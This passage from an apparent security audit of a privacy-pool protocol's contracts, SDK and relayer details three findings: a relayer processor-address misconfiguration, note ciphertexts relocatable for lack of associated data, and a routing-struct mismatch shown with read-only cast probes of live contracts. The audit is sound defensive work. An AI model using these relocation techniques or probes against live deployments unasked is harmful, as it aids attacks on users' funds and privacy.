No single value makes all three work. Set it to `PrivacyPoolRelay` and relayed withdrawals succeed while a relayed transfer commits a context the relayer cannot satisfy. Set it to the signer account and the reverse happens. Set it to `RelaySwaps` and both of the others fail. At most one of the three flows can be configured correctly at any time.

The revert differs by flow, and neither name points at the configuration. On the transfer, withdrawal and swap paths the relayer substitutes its own processor into the call arguments, so `_transactParams.processor == msg.sender` still holds and the transaction dies on the second check, `PoolVault_ProofContextMismatch`. On the batch path the relayer forwards the SDK's `transactParams` unchanged to `PrivacyPoolRelay.relayBatch`, so a misconfigured value fails the first check instead, `PoolVault_InvalidProcessor`.

An integrator cannot discover the missing values from the relayer either. The details endpoint publishes the deployment's contract addresses, `entrypoint`, `poolVault`, `relay` and, where swaps are supported, `relaySwaps`, and the relayer's signer account appears nowhere in the shape of that response, `FullConfigDto`. Two of the three values the binding needs are obtainable from the configuration interface; the one the transfer path needs is not. The documentation carries the same single-value assumption: the `RelayerInfo` field table in the relayer-interactor page lists `url`, `name`, `chainId`, `chainType` and `status` and omits `address` and `processorAddress` entirely, and the pool-session page describes the third-party case in the singular, "When using a third-party relayer, the relayer's processor address is used instead."

Nothing in the repository exercises the split. The relayer's own end-to-end harness works around it by bypassing `RelayerInfo`: the relay tests build transfer proofs with `processor: RELAYER_SIGNER_ADDRESS`, while the batch test builds its payload with `processorAddress: SEPOLIA_CONTRACTS.relayContract` and `ProofService` defaults the processor to that same relay contract. The sample application and the integration helpers do the opposite, since `createPoolSession` and `createTestSession` each construct their single relayer entry with `processorAddress: config.relayerProcessorAddress`, one value read from the `RELAYER_PROCESSOR_ADDRESS` environment variable and used for every flow. The SDK's unit tests for the transfer path set `processorAddress` to the zero address against a mocked orchestrator and a mocked relayer, so neither the context binding nor the relayer's choice of caller is exercised anywhere in the automated suite.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L136-L150
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/chain.service/evm.chain.service.ts#L581-L601
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/chain.service/evm.chain.service.ts#L672-L690
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/chain.service/evm.chain.service.ts#L604-L628
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/types/RelayerInteractor.ts#L31-L46
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/TransactOrchestrator.ts#L807-L829

#### Impact

Nothing here moves funds and there is no attacker. The failure is closed at every step: the context is computed before proving, the processor is never transmitted to the relayer on the transfer path, since `relayTransfer` sends only the signed fee commitment, the proof, the note data and the input and output counts, and a mismatch is caught by `simulateContract` before `writeContract` is reached. A fail-open outcome is not reachable, because the vault's own two checks precede every state write.

The cost falls on the user as wasted work. Whichever flows are not the configured one fail after the user has paid the full proving cost, and they fail at the relayer with a rejection rather than with anything that explains the cause. Because the configuration is a single field, this is a permanent property of a deployment rather than an intermittent fault: an operator who configures for withdrawals has silently disabled relayed transfers for every user, indefinitely, and one who configures for transfers has disabled withdrawals and swaps. The details endpoint does not close the gap, since it publishes `relay` and `relaySwaps`, so an integrator reading it can get two of the three values right and has no way at all to obtain the third.

#### Recommendation

We recommend giving the relayer a single caller for all three flows, routing the private transfer through `PrivacyPoolRelay` the way the withdrawal family already is, so that one configured `processorAddress` is correct everywhere. That also settles the payout treatment, because on the direct-vault transfer path the vault pays `amountOut` to `msg.sender`, which is the relayer's signer account, so the `feeRecipient` in the routing blob the commitment names is never consulted. If the caller has to stay per-flow instead, `RelayerInfo` needs one field per flow, the details endpoint has to publish all three and the `RelayerInfo` documentation table has to list them, and the payout limb would still need addressing separately.

We also recommend exercising all three flows against a real relayer in a suite that runs on every change. The integration workflow is `workflow_dispatch`-only, and the SDK unit tests for the transfer path pass with `processorAddress` set to the zero address, so no test in the suite can fail for this defect.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #031 — `CryptoService` seals note payloads with no associated data, binding a ciphertext to no chain, vault or event

**Severity:** Low · **Location:** `packages/sdk/src/services/CryptoService.ts` · **Bug:** High · **Payout:** Medium · **Novelty:** NEW · **Reach:** PERM · **Root cause:** RC-04 (2 findings) · **Kill chain:** KC-04 · **Status:** Open

#### Description

A note is the pool's unit of private value. When one party creates a note for another, it seals the fields that make that note spendable, the note secret, the value, the asset and the label, to the recipient's viewing key, and emits the sealed bytes on chain as event data. The recipient's client walks those events, tries to open each one, and keeps the ones that open. Opening a payload is the whole of how a holder learns that a note belongs to them, and viewing keys are published on chain, so anyone can seal a payload to anyone.

That leaves where a ciphertext came from as the only thing a client could still check, and the cipher in use offers the place to record it. An AEAD, authenticated encryption with associated data, takes a second input beside the plaintext: authenticated rather than encrypted, it carries the sealer's statement of the context the ciphertext belongs to, which chain, which contract, which kind of payload. Supply it and the seal will not open anywhere that statement fails to match. Omit it and the ciphertext is valid under its key alone, so it can be lifted out of the place it was published and presented anywhere else the same key applies. The package treats this as its own standard: the sibling at-rest sealing layer makes the parameter required rather than optional, and its comment names the note-sealing call site as the construction it was modelled on.

**Where it breaks.** Two sealing layers sit in the same package, and only one of them says where its ciphertexts belong:

- the at-rest layer takes associated data as a required parameter, builds it from a record marker, a format version and the logical storage key, and on the way back in checks the envelope's chain identifier against the session's;
- the note layer calls the same cipher with the payload alone, under a key that is a bare hash of the shared secret the sender derives by Diffie-Hellman against the recipient's published viewing key, with no chain, no contract and no payload kind mixed into it.

The viewing key that note key is derived against names no chain either, so a single viewing key serves every deployment.

A sealed note is therefore a bearer object that opens the same wherever it is presented, and because opening it is the only test a client has, a payload copied out of its event into a deposit on another vault, into the same deployment on another chain, or into a registry channel that emits arbitrary bytes for any caller is reported to its recipient as an authentic discovery of a note that no vault of theirs contains.

The SDK constructs an AEAD cipher in exactly four places. Two of them, `CryptoService.encrypt` and `CryptoService.decrypt`, seal every note payload: both build the cipher as `managedNonce(xchacha20poly1305)(key)` and call `encrypt` or `decrypt` on the payload alone, never supplying the second, associated-data argument that the same library accepts. The key they use comes from `secretToKey`, which is a bare sha256 of the raw ECDH output truncated to the key length, with no key-derivation function, no salt, no info string, no chain identifier, no contract address and no payload-kind tag.

A note ciphertext is therefore a free-floating bearer object. It authenticates one fact, that its author performed ECDH against the recipient's published viewing key, and decrypts identically regardless of which chain, which vault, or which event it is presented in.

This is the project's own standard, absent from the path that carries spendable secrets. The sibling at-rest sealing layer in the same package makes associated data a required positional parameter of both `aeadEncrypt` and `aeadDecrypt`, and its doc comment names this exact call site as the comparison, "identical construction to `CryptoService.encrypt`", records that the parameter "binds a ciphertext to its context … without it, ciphertext is valid under the key alone and can be relocated anywhere the same key applies", and states why it is not optional:

> It is required, not optional … a security parameter that can be omitted is one that will be, silently, and the omission is invisible at the call site because an unbound ciphertext round-trips perfectly.

`atRestRecordAad`, which builds that layer's associated data from a record marker, a format version and the logical storage key, names the threat model directly:

> An attacker able to write the backing store could therefore transplant a valid ciphertext from one storage key to another — across owners, chains, or record kinds — and it would decrypt cleanly, because nothing in the sealed bytes says where it belongs.

The standard runs on a live product path, not only in documentation. `sealValue` and `openSealed` seal under `AT_REST_ENVELOPE_AAD`, `PoolSessionExport.exportAccountSealed` and `importAccountSealed` reach them from any session, and on the way back in `importAccount` calls `assertEnvelopeMatches`, which throws `AccountExportMismatch` when the envelope's `chainId` differs from the session's. The account-export path both binds context into the associated data and checks the chain identifier on import. The note-discovery path does neither.

The same inconsistency shows up in the key schedule. `CryptoService` imports `hkdf`, `extract` and `expand` and uses them nine times across the file: three `hkdf` calls in `derivePaymentRequestKeys`, `deriveRootSecret` and `deriveAppSecret`, plus one `extract` and five `expand` calls that build the whole identity and viewing key tree with explicit domain and info strings. Every key the protocol depends on is derived correctly. The one key that seals note payloads is a bare hash.

The key material is chain-independent as well, which extends relocation across deployments. `deriveKeysFromSignature` derives the viewing key from the signature's `r` component, the signer address, the application identifier folded in by `deriveAppSecret`, and the revocable key index. No chain identifier appears anywhere in that derivation. The typed-data payload that produces the signature is not built by this SDK at all: the design documentation states plainly that "the SDK does not ship an EIP-712 payload builder" and gives integrators a reference domain of `name`, `version`, `verifyingContract = 0x0…0` and `salt = keccak256(APP_IDENTIFIER)`, with no `chainId` field. The contrast is internal: `buildSetAuthPolicyTypedData`, the one EIP-712 domain the SDK actually constructs, does set `chainId` alongside `verifyingContract`. The domain the SDK builds is chain-bound; the domain it only documents is not, so one viewing key serves every deployment.

Sender and recipient both confirm the gap. `NoteComputationService.encryptAndWrap`, shared by `generateNoteData` and `generatePaymentRequestNoteData`, generates an ephemeral X25519 pair, performs ECDH against the recipient's viewing public key, encrypts, and emits `ephemeralPubKey ‖ ciphertext`. `NoteDiscoveryService.tryDecryptEvent` performs the inverse, and its own comment states that "the ECDH-then-decrypt path is the only correct rejection criterion." There is not even a pre-filter on the hint, the short tag each `Note` event publishes beside the ciphertext so that a recipient can skip events cheaply, and that is by deliberate design, because anonymous-discovery notes carry random hints. Neither direction names the chain, the pool, the transaction, the event index or the payload kind. The plaintext carries a version and a kind byte, but those sit inside the sealed envelope, so they discriminate a decode, not a context.

Relocation follows directly, and it does not need the chain-free key. Within one chain, a `Note` event's `data` field can be copied verbatim into another deposit's note data, into a deposit on a different vault, or into the association-set registry's permissionless channel, `ASPRegistry.registerLabel`, and it decrypts identically in each. Across chains it works too, because the viewing key is the same on both: the production stack is live at identical addresses on chain 1 and chain 56, with `PoolVault` at `0x0Eb42804BF897662aF851370eaeAdcDBEC1b97ed` on each.

The bound on this is that a replayed payload is never a spendable note. `PoolVault.deposit` requires `_proof.context() == uint256(keccak256(abi.encode(_noteData))) % SNARK_SCALAR_FIELD`, so the deposit proof commits to the exact note data and the attacker must fund a real deposit of their own to carry the blob. That call carries `checkAccess(DEPOSITOR_ROLE)`, but the public route into it, `Entrypoint.deposit`, has no access modifier; what it enforces is `_config.minAmount`, which on the live stacks is 0.004 ETH on chain 1 and 0.02 BNB on chain 56, with `vettingFeeBPS` at 0 on every enabled asset on both. That deposit stays the attacker's own note, and the commitment the victim's client recomputes from the relocated payload does not exist in the victim's local vault. What the replay produces is a decryptable payload that resolves to nothing.

The payload kinds are separated in the plaintext rather than in the cryptography: `NoteComputationService.deserializeV2` asserts `kind === KIND_FULL` and rejects the blind kind, and `decodePaymentRequestNotePayload` performs the symmetric rejection. That separation is one refinement deep in the decoded bytes, so it holds today, but it is not enforced by the seal, and a decoder that forgot the check would not be caught by the cryptography.

The same absence of domain separation shows up on the stealth path, where a payment is delivered to a fresh one-time address that only the recipient can derive, and where a single 32-byte value does three jobs. `NoteDiscoveryService.tryDecryptStealthDepositEvent` passes the scan's `sharedSecret`, the ECDH shared hash returned as `sharedSecret: match.sharedHash` by `scanDepositNoteData`, straight to `decryptNotePayload` as the symmetric secret. The same value is reduced modulo the curve order and used as the scalar that derives the one-time stealth private key from the recipient's long-term spending private key, additively in `deriveStealthPrivateKeyCanonical` (`stealth_priv = (spending_priv + k) mod n`) and multiplicatively in `deriveStealthPrivateKeyFluidKey`. Its first byte is `computeViewTag`'s output, published on chain in the announcement metadata, and `computeViewTag`'s own comment says so: "both the view tag and the stealth-scalar reuse the same 32-byte output." `deriveStealthSharedSecret` and `recoverStealthSharedSecret` are exported helpers that hand this value out for the decryption purpose specifically.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/CryptoService.ts#L100-L127
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/CryptoService.ts#L308-L321
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/utils/AtRestSealing.ts#L56-L89
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/utils/AtRestSealing.ts#L91-L116
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionExport.ts#L186-L199
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/NoteComputationService.ts#L222-L251
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/NoteDiscoveryService.ts#L216-L253
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L96-L134
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/NoteDiscoveryService.ts#L267-L303
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/stealth/viewTag.ts#L13-L30

#### Impact

A ciphertext that is valid everywhere can be moved anywhere the same viewing key applies, which, because the derivation names no chain, is every deployment. The harm is what the victim's client does with it: it decrypts a payload it believes was addressed to the user, computes a commitment that is absent from the local vault, and has to decide what an unresolvable but authentic discovery means.

That is a correctness problem in the discovery path rather than a loss of funds, and two limits keep it there. First, no relocated blob ever becomes spendable value: the deposit proof commits to the note data, so carrying one costs the attacker a funded deposit at or above the entrypoint minimum, and the resulting note is the attacker's own. Second, the attacker gains no capability they lacked, because `Keystore.viewingKeys` is a public getter and `ViewingKeySet` is emitted on every set, so anyone could always author a fresh payload to any recipient. The relocated ciphertext was, by construction, already addressed to and already readable by the victim.

Every note-decode path reachable from an ordinary session accepts an unbound ciphertext: `NoteDiscoveryService.tryDecryptEvent` on the catch-all scan, `processTargetedEvent` and `processPaymentRequestEvent` on the hint-matched scans, and `tryDecryptStealthDepositEvent` on the stealth path, with `decodeASPCipherText` the same shape on the operator side. An associated-data argument at either note-path AEAD call site, or any context check on chain identifier, vault address, event position or payload kind applied before or after the seal opens, would falsify that, and neither exists on any of those paths. The label channel adds an on-chain variant with no deposit at all: `ASPRegistry.registerLabel` takes arbitrary bytes from any caller and does nothing but emit them, so an association-set ciphertext can be relocated there for the cost of a transaction.

The stealth shared-secret reuse is the part with the most room to become worse, and its present scope is narrower than it first appears. The disclosed value is a scalar offset, `k = sharedHash mod n`, combined with the spending private key by addition in the canonical scheme and by multiplication in the FluidKey variant, so it is not spendable on its own, and the spending private key is never disclosed alongside it. What disclosure costs is real but bounded: anyone handed it can match its first byte against a published view tag and so confirm which announcement it belongs to, and it converts any later compromise of a single stealth private key into a compromise of the spending key, since the canonical scheme's `spending_priv = stealth_priv − k` follows immediately and the FluidKey inverse just as directly. Delegating the ability to read a note is not delegating a spending key today, but it is delegating half of one.

#### Recommendation

We recommend binding the note-payload seal to its context: add associated data covering, at minimum, the chain identifier, the entrypoint or vault address, and the payload kind, and reject on mismatch. The at-rest layer in the same package already demonstrates the pattern end to end, with a required rather than optional parameter and a builder that folds marker, version and logical key together, and because the call sites and their signatures change together, the type checker will drive the change. Apply it at every unbound seal rather than at the note path alone: `encodeASPCipherText` in `ASPUtils` derives a shared secret by `ecdh` and passes it to the same `encrypt` with no associated data, over a payload carrying `noteAddressHash`, `tokenId`, `value` and the deposit secret, so a ciphertext produced for one chain and vault is accepted by any other. Replace the bare hash of the ECDH output with a proper key-derivation step at the same time: the file already imports HKDF and uses it correctly for the entire key tree, so extract and expand with a salt and an info string naming the chain, the contract and the payload kind, exactly as `deriveKeys` already does for the identity and viewing domains. On the stealth path, derive three separate values from the stealth shared hash with distinct info strings, so that disclosing the decryption capability through `deriveStealthSharedSecret` or `recoverStealthSharedSecret` does not also disclose the scalar offset that relates the stealth key to the spending key.

We also recommend either including a chain identifier in the viewing-key derivation or accepting the cross-chain key reuse deliberately and binding the chain in the associated data instead, and then recording which of the two was chosen in the derivation's documentation, which currently gives a reference typed-data domain with no `chainId` and no statement that the omission is intended, while the SDK's own `buildSetAuthPolicyTypedData` sets one.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #032 — The SDK and relayer both encode a 14-field `SwapRouting`, so the five live `RelaySwaps` that decode 11 revert

**Severity:** Low · **Location:** `packages/swaps/contracts/src/RelaySwaps.sol` · **Bug:** High · **Payout:** Low · **Novelty:** DIFF · **Reach:** CONFIG · **Status:** Open

#### Description

A withdraw-and-swap spends a user's note, pulls the tokens out of the pool, swaps them through a DEX aggregator and pays the output to a recipient, all in one transaction; a reshield does the same and redeposits the output into a pool instead of paying it out. The relayer drives both by calling `execute` on a `RelaySwaps` contract and handing it one ABI-encoded tuple that says which router to call, which token to deliver, to whom, at what fee and above what minimum output. The user's proof commits to that tuple, so the relayer can carry it but cannot change it.

Five of the six deployed `RelaySwaps` instances the deployment manifests name reject every relay-swap and every reshield sent to them, for every user, on every attempt. Nothing self-corrects, because the refusal is not a rate limit, a slippage failure or a stale quote: no retry, no smaller amount and no different token changes it, and only a redeploy or a matching code change on both sides would. It is at least fail-closed. The refusal lands at the second step of `execute`, six steps ahead of the pool call, so no nullifier is spent, no commitment is recorded and nothing is stranded in the contract; what the user loses is the roughly 30 to 60 seconds of proving already spent before the refusal arrives.

**Where it breaks.** The tuple the encoders write and the tuple those contracts read are not the same shape:

- both shipped encoders, the SDK's and the relayer's, emit all fourteen members of the current `SwapRouting`, unconditionally and with no per-chain variant;
- the five instances decode the eleven-member `SwapRouting` of an earlier commit, and the three fields added since were inserted into the middle of the struct rather than appended to the end of it.

An eleven-member decoder reading a fourteen-member payload therefore looks for the trailing byte string at the wrong word and aborts on an impossible allocation, `Panic(0x41)`, Solidity's panic for allocating too much memory, before the contract runs the first of its own checks. Neither side can notice: the contract publishes no layout or version constant, and neither encoder looks for one.

The withdraw-and-swap and reshield features are therefore unavailable rather than degraded wherever one of those five instances is the contract the relayer calls, and the panic code that identifies why never reaches the caller, because the relayer's public error template carries a decoded custom-error name and one of ten fixed classification labels and has no field for a panic.

In the `RelaySwaps` contract, `execute` decodes its routing tuple as step 2 in the numbering the function's own comments carry, `SwapRouting memory _r = abi.decode(_transactParams.data, (SwapRouting))`, ahead of the router allowlist checks and well ahead of `POOL.transact` in step 8. `SwapRouting` has 14 members at this commit. At commit `38c16e7` it had 11, and the three fields of what the contract's own comments call its B2 block, the self-funded gas swap that mints a bridge's native messaging fee inside the contract, namely `swapValue`, `gasSwapMaxInput` and `gasSwapCalldata`, were inserted before `swapCalldata` rather than appended after it. For an 11-field decoder the word that used to carry the `swapCalldata` offset now carries `swapValue`, which is zero on every non-B2 path, so the decoder reads a bytes length out of word 0 of the tuple, the `swapTarget` address taken as a `uint256`, and fails the allocation with `Panic(0x41)`. Zeroing the three new fields does not avoid it, because what moved is the position of `swapCalldata`.

Both encoders emit all 14 members unconditionally. The SDK's `RELAY_SWAP_ROUTING_ABI` and the relayer's `relaySwapRoutingParams` declare the same fourteen components, with no 11-field variant, no per-chain branch and no version word inside the tuple. There is also nothing on the contract to negotiate against: `RelaySwaps` is a plain `Ownable` contract with immutable `POOL` and `ENTRYPOINT`, no proxy and no initializer, and its external surface is `NATIVE_ASSET`, `POOL`, `ENTRYPOINT`, `approvedRouters`, `approveRouter`, `removeRouter`, `changeOwnership`, `renounceOwnership`, `rescue` and `execute`. No layout constant, no `VERSION()`, and no probe of either at SDK session build or at relayer boot.

Read-only `eth_call` against every `RelaySwaps` instance the deployment manifests name, with the three B2 fields zeroed so the non-B2 path is the one exercised:

| Instance | Chain | 14-field payload | 11-field payload |
| --- | --- | --- | --- |
| `0x5F3927f24Ec20F49B3850a5b78EB2015945E57F7` | mainnet | `Panic(0x41)` | `PoolVault_ProofContextMismatch` |
| `0x3b20f2dfc225b54567561343a1c63eebb8db63f5` | Optimism | `Panic(0x41)` | `PoolVault_ProofContextMismatch` |
| `0x7430cc030d7eb8c83e76cd983996982c8c054204` | Optimism | `Panic(0x41)` | `PoolVault_ProofContextMismatch` |
| `0xbf33ea44eed5331a97bb620e02f5910c2fa65c58` | Arbitrum | `Panic(0x41)` | `PoolVault_ProofContextMismatch` |
| `0xc59b82d4c00d181a5cfa0666170690047b32db98` | Base | `Panic(0x41)` | `PoolVault_ProofContextMismatch` |
| `0x9Ee097cF663a1816C4Fc2F12BDe259563F7265C4` | BSC | `PoolVault_ProofContextMismatch` | revert with no return data |

The right-hand column is the load-bearing one. `PoolVault_ProofContextMismatch` is the second statement of `PoolVault.transact`, after the `_transactParams.processor == msg.sender` check and before `_validateAndVerify`, so a payload that reaches it has already cleared every check in `RelaySwaps`: the three zero-address requires, both `approvedRouters` lookups, the native-gas and minimum-output conditions and the `maxRelayFee` comparison, and the pool has then accepted the call as coming from its own processor. On those five instances the only thing standing between the contract and a working relay-swap is a valid proof. They are live and correctly wired: each returns `POOL()` and `ENTRYPOINT()` matching its manifest row, and `approvedRouters` returns true for the LiFi Diamond, the aggregator router these deployments swap through.

The failure is fail-closed and it lands early. Step 2 is six steps ahead of `POOL.transact`, so no nullifier is spent, no commitment is recorded, no state root advances and nothing is left stranded in the contract. What a user loses is the work that precedes the revert. The SDK builds the session, asserts both LiFi addresses against `approvedRouters` on this same contract, and generates the proof, which the repository's own LiFi quote-provider documentation puts at roughly 30 to 60 seconds; the relayer's `simulateContract` then refuses, and the product is unavailable rather than degraded. Every relay-swap and every reshield routed at one of the five instances fails this way, for every user, on every attempt. The relayer's public error template reproduces a decoded custom-error name plus one of ten fixed classification labels, none of which carries a panic code, so the `0x41` that identifies the cause does not reach the caller.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L64-L93
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L252-L258
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/constant/PoolSessionTransact.ts#L42-L64
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/relay/evm/swap_routing_abi.ts#L24-L44
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L142-L149
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/deploy.md#L19
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/deployments-it-003.json#L8-L14

#### Impact

A redeploy is the obvious fix, and the deployment record does not say where it should land. The CREATE2 address `deploy.md` names for production, `0x5936aEfB2134550F3f526d65E984620582D270E7`, has zero code on Optimism, Arbitrum and Base, so on those three chains there is no new-layout instance to repoint anything at. On mainnet that address does hold the new layout and does accept the 14-field payload, but it reports `POOL()` as `0x0Eb42804BF897662aF851370eaeAdcDBEC1b97ed` and `ENTRYPOINT()` as `0xca1e072236D231130059eeA6Bfceb7F4e9a1F0C3`, and neither of those two addresses appears anywhere in the repository, in any manifest, registry, config or fixture. The mainnet row of `deployments-it-003.json` names a different `RelaySwaps` entirely, `0x5F3927f24Ec20F49B3850a5b78EB2015945E57F7`, wired to the pool and entrypoint that row does list. The repository therefore names two mainnet `RelaySwaps` serving two different pools and reconciles them nowhere, so neither an operator nor a reader can determine which one is production, and a redeploy has no record to be checked against.

#### Proof of concept

The table above is reproduced by read-only calls. Every command below is an `eth_call` or an `eth_getCode`. No transaction is sent, no account is unlocked, and no private key is used or required.

```bash
DIAMOND=0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE
DUST=0x000000000000000000000000000000000000dEaD
Z=0x0000000000000000000000000000000000000000

RS=0x5F3927f24Ec20F49B3850a5b78EB2015945E57F7  # mainnet, the it-003 manifest row
TOKEN=0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48  # mainnet USDC
RPC=https://ethereum-rpc.publicnode.com

# The 14-field tuple both shipped encoders produce, B2 fields zeroed.
R14=$(cast abi-encode \
  "f((address,address,address,address,address,address,address,uint256,uint256,uint256,uint256,uint256,bytes,bytes))" \
  "($DIAMOND,$DIAMOND,$TOKEN,$Z,$Z,$Z,$DUST,0,0,0,0,0,0x,0x)")

# The 11-field tuple the deployed decoders expect.
R11=$(cast abi-encode \
  "f((address,address,address,address,address,address,address,uint256,uint256,uint256,bytes))" \
  "($DIAMOND,$DIAMOND,$TOKEN,$Z,$Z,$Z,$DUST,0,0,0,0x)")

# pubSignals[5][0] is amountOut and pubSignals[6][0] is tokenIdOut; the Groth16
# points are placeholders, because neither payload reaches the verifier.
PROOF="([1,2],[[3,4],[5,6]],[7,8],[[0],[0],[0],[0],[0],[1000000],[$(cast to-dec $TOKEN)],[0]])"
SIG='execute((uint256[2],uint256[2][2],uint256[2],uint256[][]),(address,bytes),(bytes32,bytes)[])'

cast call $RS "$SIG" "$PROOF" "($RS,$R14)" "[]" --rpc-url $RPC
cast call $RS "$SIG" "$PROOF" "($RS,$R11)" "[]" --rpc-url $RPC

# Wiring, for the "live and correctly wired" claim.
cast call $RS 'POOL()(address)' --rpc-url $RPC
cast call $RS 'ENTRYPOINT()(address)' --rpc-url $RPC
cast call $RS 'approvedRouters(address)(bool)' $DIAMOND --rpc-url $RPC

# The production CREATE2 address, on the three chains where it holds nothing.
cast code 0x5936aEfB2134550F3f526d65E984620582D270E7 --rpc-url https://mainnet.optimism.io
cast code 0x5936aEfB2134550F3f526d65E984620582D270E7 --rpc-url https://arb1.arbitrum.io/rpc
cast code 0x5936aEfB2134550F3f526d65E984620582D270E7 --rpc-url https://mainnet.base.org
```

The two `cast call` invocations cover one row. The rest follow by substituting `RS`, `TOKEN` and `RPC`: Optimism at `https://mainnet.optimism.io` with USDC `0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85`, Arbitrum at `https://arb1.arbitrum.io/rpc` with `0xaf88d065e77c8cC2239327C5EDb3A432268e5831`, Base at `https://mainnet.base.org` with `0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913`, and BSC at `https://bsc-rpc.publicnode.com` with `0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d`. Any ERC-20 on the chain works; `TOKEN` has to be a real token contract only because step 6 snapshots its `balanceOf` on the path the 11-field payload takes.

On the five old-layout instances the 14-field call returns `0x4e487b71` followed by a word holding `0x41`, the ABI encoding of `Panic(0x41)`, and the 11-field call returns `0x59dfbba8`, which is `cast sig "PoolVault_ProofContextMismatch()"`. The prose an RPC wraps around that panic varies by node, "out of memory" on one endpoint and "panic: memory allocation error (0x41)" on another, so the return data rather than the message is what to read. On the BSC instance the 14-field call returns `0x59dfbba8` and the 11-field call reverts with no return data. The three `cast code` calls each return `0x`. The same `cast code` output also supplies the stopgap fingerprint named in the Recommendation: the runtime of an old-layout instance is 10,604 bytes and contains neither `bc170963` nor `e40382f1`, the selectors of `RelaySwaps_GasSwapInsufficient` and `RelaySwaps_GasSwapNativeInput`, while a new-layout runtime is 11,202 bytes and contains both.

These probes read chain state at the moment they run, against public endpoints. They establish what each address holds and how it behaves, not which contract address any particular relayer deployment is configured to call, which is a configuration fact outside the repository.

#### Recommendation

We recommend giving `RelaySwaps` a layout constant, a `ROUTING_LAYOUT()` or `VERSION()` returning an identifier for the `SwapRouting` shape it decodes, bumping it on every change to that struct, and having both encoders read it before they commit to a tuple. The probe already exists on both sides, and the one field never read is the one that differs. The SDK reads `approvedRouters` off this same contract before it starts proving, in `assertLiFiAddressAllowed`, so an additional `readContract` against the same address costs one call and moves the failure from after the proof to before it. The relayer already refuses to start on a bad chain configuration through `RateProviderBootValidator`, so a sibling boot check comparing that constant against what `relaySwapRoutingParams` encodes would keep a relayer from serving a chain whose processor it cannot transact with. Until the constant exists, a boot-time `eth_getCode` fingerprint for the two selectors that appear only inside the B2 block gives the same answer in five lines. Publishing the constant on the relayer's details response, alongside the `relaySwaps` address it already carries, would let an integrator refuse a mismatched processor as well.

We also recommend redeploying on Optimism, Arbitrum and Base and reconciling the mainnet record in the same pass. `deploy.md` and `deployments-it-003.json` currently name two different mainnet `RelaySwaps` wired to two different pool and entrypoint pairs, one of which appears in no manifest, registry or fixture in the tree, and the CREATE2 recipe yields one address per constructor-argument set, so it reproduces the mainnet address on another chain only where the pool and entrypoint match. Whichever instance is production on each chain, the manifests should say so and should be the source the relayer and the SDK are configured from.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

